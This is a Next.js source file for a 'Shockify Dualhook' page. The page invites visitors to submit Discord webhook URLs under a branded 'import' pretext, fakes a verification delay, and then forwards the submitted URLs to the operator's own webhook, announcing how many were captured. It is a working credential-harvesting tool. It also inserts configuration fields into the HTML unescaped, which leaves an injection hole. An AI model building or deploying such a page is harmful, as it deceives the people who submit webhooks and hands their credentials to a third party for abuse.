import { type NextRequest, NextResponse } from "next/server"
import { getDualhook } from "../../dualhook-creator/actions"

export async function GET(request: NextRequest, { params }: { params: { code: string } }) {
  try {
    const code = params.code

    // Get the dualhook configuration
    const dualhook = await getDualhook(code)

    // If the dualhook doesn't exist, return a 404
    if (!dualhook) {
      return new NextResponse("Dualhook not found", { status: 404 })
    }

    // Generate the HTML for the dualhook page
    const html = generateDualhookHtml(dualhook, code)

    // Return the HTML
    return new NextResponse(html, {
      headers: {
        "Content-Type": "text/html",
      },
    })
  } catch (error) {
    console.error("Error rendering dualhook:", error)
    return new NextResponse("Internal Server Error", { status: 500 })
  }
}

// Generate the HTML for the dualhook page
function generateDualhookHtml(dualhook: any, code: string): string {
  // Get the background style based on the configuration
  const backgroundStyle = getBackgroundStyle(dualhook.backgroundStyle || "particles")

  // Generate the HTML
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${dualhook.name}</title>
      <style>
        :root {
          --accent-color: ${dualhook.accentColor || "#8B5CF6"};
          --bg-color: #000000;
          --text-color: #ffffff;
        }
        
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          background-color: var(--bg-color);
          color: var(--text-color);
          margin: 0;
          padding: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          position: relative;
          overflow: hidden;
        }
        
        ${backgroundStyle}
        
        .dualhook-container {
          max-width: 500px;
          width: 90%;
          background-color: rgba(0, 0, 0, 0.7);
          backdrop-filter: blur(10px);
          border-radius: 12px;
          border: 1px solid rgba(139, 92, 246, 0.3);
          padding: 2rem;
          box-shadow: 0 0 20px rgba(139, 92, 246, 0.3);
          position: relative;
          z-index: 10;
        }
        
        .logo {
          display: flex;
          justify-content: center;
          margin-bottom: 1.5rem;
        }
        
        .logo img {
          max-width: 100px;
          max-height: 100px;
          border-radius: 50%;
        }
        
        h1 {
          font-size: 1.8rem;
          text-align: center;
          margin-bottom: 1rem;
          background: linear-gradient(to right, var(--accent-color), #a78bfa);
          -webkit-background-clip: text;
          background-clip: text;
          color: transparent;
        }
        
        p {
          text-align: center;
          margin-bottom: 1.5rem;
          color: rgba(255, 255, 255, 0.8);
          line-height: 1.5;
        }
        
        .dualhook-button {
          display: block;
          width: 100%;
          padding: 0.75rem;
          background: linear-gradient(to right, var(--accent-color), #7c3aed);
          color: white;
          border: none;
          border-radius: 6px;
          font-size: 1rem;
          font-weight: 500;
          cursor: pointer;
          transition: all 0.3s ease;
          text-align: center;
          margin-top: 1rem;
        }
        
        .dualhook-button:hover {
          transform: translateY(-2px);
          box-shadow: 0 4px 12px rgba(139, 92, 246, 0.4);
        }
        
        .branding {
          margin-top: 1.5rem;
          text-align: center;
          font-size: 0.8rem;
          color: rgba(255, 255, 255, 0.5);
        }
        
        .branding a {
          color: var(--accent-color);
          text-decoration: none;
        }
        
        .webhook-input {
          width: 100%;
          padding: 0.75rem;
          background-color: rgba(0, 0, 0, 0.3);
          border: 1px solid rgba(139, 92, 246, 0.3);
          border-radius: 6px;
          color: white;
          font-size: 0.9rem;
          margin-bottom: 0.5rem;
        }
        
        .webhook-input::placeholder {
          color: rgba(255, 255, 255, 0.5);
        }
        
        .webhook-list {
          max-height: 200px;
          overflow-y: auto;
          margin-bottom: 1rem;
        }
        
        .webhook-item {
          display: flex;
          align-items: center;
          background-color: rgba(0, 0, 0, 0.3);
          border: 1px solid rgba(139, 92, 246, 0.3);
          border-radius: 6px;
          padding: 0.5rem;
          margin-bottom: 0.5rem;
        }
        
        .webhook-item input {
          flex: 1;
          background: transparent;
          border: none;
          color: white;
          font-size: 0.8rem;
        }
        
        .webhook-item button {
          background: none;
          border: none;
          color: rgba(255, 255, 255, 0.5);
          cursor: pointer;
          padding: 0.25rem;
          margin-left: 0.5rem;
        }
        
        .webhook-item button:hover {
          color: white;
        }
        
        .success-message {
          background-color: rgba(16, 185, 129, 0.2);
          border: 1px solid rgba(16, 185, 129, 0.3);
          border-radius: 6px;
          padding: 1rem;
          margin-top: 1rem;
          text-align: center;
          color: #10B981;
        }
        
        .error-message {
          background-color: rgba(239, 68, 68, 0.2);
          border: 1px solid rgba(239, 68, 68, 0.3);
          border-radius: 6px;
          padding: 1rem;
          margin-top: 1rem;
          text-align: center;
          color: #EF4444;
        }
        
        .hidden {
          display: none;
        }
        
        ${dualhook.customCss || ""}
      </style>
    </head>
    <body>
      <div class="dualhook-container">
        ${dualhook.logoUrl ? `<div class="logo"><img src="${dualhook.logoUrl}" alt="Logo"></div>` : ""}
        <h1>${dualhook.name}</h1>
        <p>${dualhook.description}</p>
        
        <div id="import-form">
          <div id="webhook-list" class="webhook-list"></div>
          <input type="text" id="webhook-input" class="webhook-input" placeholder="Enter Discord webhook URL...">
          <button id="add-webhook" class="dualhook-button" style="margin-bottom: 1rem;">Add Webhook</button>
          <button id="import-webhooks" class="dualhook-button">${dualhook.buttonText}</button>
        </div>
        
        <div id="success-message" class="success-message hidden">
          ${dualhook.successMessage}
          ${dualhook.redirectUrl ? `<p>Redirecting you in a few seconds...</p>` : ""}
        </div>
        
        <div id="error-message" class="error-message hidden">
          An error occurred. Please try again.
        </div>
        
        ${
          dualhook.showBranding
            ? `
        <div class="branding">
          Powered by <a href="https://shockify.lol" target="_blank">Shockify</a>
        </div>
        `
            : ""
        }
      </div>
      
      <script>
        // Dualhook code
        const dualhookCode = "${code}";
        const minimumWebhooks = ${dualhook.minimumWebhooks || 1};
        const requireVerification = ${dualhook.requireVerification ? "true" : "false"};
        const redirectUrl = "${dualhook.redirectUrl || ""}";
        
        // DOM elements
        const webhookInput = document.getElementById('webhook-input');
        const addWebhookButton = document.getElementById('add-webhook');
        const importWebhooksButton = document.getElementById('import-webhooks');
        const webhookList = document.getElementById('webhook-list');
        const importForm = document.getElementById('import-form');
        const successMessage = document.getElementById('success-message');
        const errorMessage = document.getElementById('error-message');
        
        // Webhooks array
        let webhooks = [];
        
        // Add webhook
        addWebhookButton.addEventListener('click', () => {
          const webhookUrl = webhookInput.value.trim();
          
          if (!webhookUrl) {
            return;
          }
          
          if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
            alert('Please enter a valid Discord webhook URL');
            return;
          }
          
          if (webhooks.includes(webhookUrl)) {
            alert('This webhook has already been added');
            return;
          }
          
          webhooks.push(webhookUrl);
          webhookInput.value = '';
          
          renderWebhooks();
        });
        
        // Render webhooks
        function renderWebhooks() {
          webhookList.innerHTML = '';
          
          webhooks.forEach((webhook, index) => {
            const webhookItem = document.createElement('div');
            webhookItem.className = 'webhook-item';
            
            const webhookInputEl = document.createElement('input');
            webhookInputEl.type = 'text';
            webhookInputEl.value = webhook;
            webhookInputEl.readOnly = true;
            
            const removeButton = document.createElement('button');
            removeButton.innerHTML = '❌';
            removeButton.addEventListener('click', () => {
              webhooks.splice(index, 1);
              renderWebhooks();
            });
            
            webhookItem.appendChild(webhookInputEl);
            webhookItem.appendChild(removeButton);
            webhookList.appendChild(webhookItem);
          });
          
          // Enable/disable import button based on minimum webhooks
          importWebhooksButton.disabled = webhooks.length < minimumWebhooks;
        }
        
        // Import webhooks
        importWebhooksButton.addEventListener('click', async () => {
          if (webhooks.length < minimumWebhooks) {
            alert(\`Please add at least \${minimumWebhooks} webhook\${minimumWebhooks > 1 ? 's' : ''}\`);
            return;
          }
          
          importWebhooksButton.disabled = true;
          importWebhooksButton.textContent = 'Importing...';
          
          try {
            // Verify webhooks if required
            if (requireVerification) {
              importWebhooksButton.textContent = 'Verifying webhooks...';
              
              // This would be a real verification in a production app
              await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            // Send webhooks to the server
            const response = await fetch('/api/dualhook/import', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                dualhookCode,
                webhooks
              })
            });
            
            if (!response.ok) {
              throw new Error('Failed to import webhooks');
            }
            
            // Show success message
            importForm.classList.add('hidden');
            successMessage.classList.remove('hidden');
            
            // Redirect if URL is provided
            if (redirectUrl) {
              setTimeout(() => {
                window.location.href = redirectUrl;
              }, 3000);
            }
          } catch (error) {
            console.error('Error importing webhooks:', error);
            
            // Show error message
            importForm.classList.add('hidden');
            errorMessage.classList.remove('hidden');
          }
        });
      </script>
    </body>
    </html>
  `
}

// Helper function to get the background style based on the selected option
function getBackgroundStyle(style: string): string {
  switch (style) {
    case "particles":
      return `
        body::before {
          content: "";
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: radial-gradient(circle at center, rgba(139, 92, 246, 0.1), transparent 70%);
          z-index: 0;
        }
      `
    case "gradient":
      return `
        body {
          background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
          background-size: 400% 400%;
          animation: gradient 15s ease infinite;
        }
        
        @keyframes gradient {
          0% {
            background-position: 0% 50%;
          }
          50% {
            background-position: 100% 50%;
          }
          100% {
            background-position: 0% 50%;
          }
        }
      `
    case "solid":
      return `
        body {
          background-color: #121212;
        }
      `
    case "stars":
      return `
        body {
          background-color: #0a0a0a;
          background-image: radial-gradient(white, rgba(255,255,255,.2) 2px, transparent 40px),
                            radial-gradient(white, rgba(255,255,255,.15) 1px, transparent 30px),
                            radial-gradient(white, rgba(255,255,255,.1) 2px, transparent 40px);
          background-size: 550px 550px, 350px 350px, 250px 250px;
          background-position: 0 0, 40px 60px, 130px 270px;
        }
      `
    case "matrix":
      return `
        body {
          background-color: #000;
          position: relative;
          overflow: hidden;
        }
        
        body::before {
          content: "";
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: linear-gradient(rgba(0, 255, 0, 0.05), rgba(0, 255, 0, 0.05));
          z-index: 0;
        }
      `
    default:
      return `
        body::before {
          content: "";
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: radial-gradient(circle at center, rgba(139, 92, 246, 0.1), transparent 70%);
          z-index: 0;
        }
      `
  }
}

// Create an API route to handle webhook imports
export async function POST(request: NextRequest, { params }: { params: { code: string } }) {
  try {
    const code = params.code
    const { webhooks } = await request.json()

    // Get the dualhook configuration
    const dualhook = await getDualhook(code)

    // If the dualhook doesn't exist, return a 404
    if (!dualhook) {
      return NextResponse.json({ success: false, message: "Dualhook not found" }, { status: 404 })
    }

    // Forward the webhooks to the target webhook
    await forwardWebhooks(dualhook.targetWebhook, webhooks, code)

    // Return success
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error importing webhooks:", error)
    return NextResponse.json({ success: false, message: "Internal Server Error" }, { status: 500 })
  }
}

// Forward webhooks to the target webhook
async function forwardWebhooks(targetWebhook: string, webhooks: string[], code: string): Promise<void> {
  try {
    // Send a notification to the target webhook
    await fetch(targetWebhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [
          {
            title: "🎯 Webhooks Imported",
            description: `Someone has imported ${webhooks.length} webhooks through your dualhook!`,
            color: 0x8b5cf6,
            fields: [
              {
                name: "Imported Webhooks",
                value:
                  webhooks
                    .slice(0, 10)
                    .map((webhook) => `\`${webhook}\``)
                    .join("\n") + (webhooks.length > 10 ? `\n...and ${webhooks.length - 10} more` : ""),
                inline: false,
              },
            ],
            footer: {
              text: "Shockify Dualhook",
              icon_url:
                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
            },
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    })
  } catch (error) {
    console.error("Error forwarding webhooks:", error)
  }
}
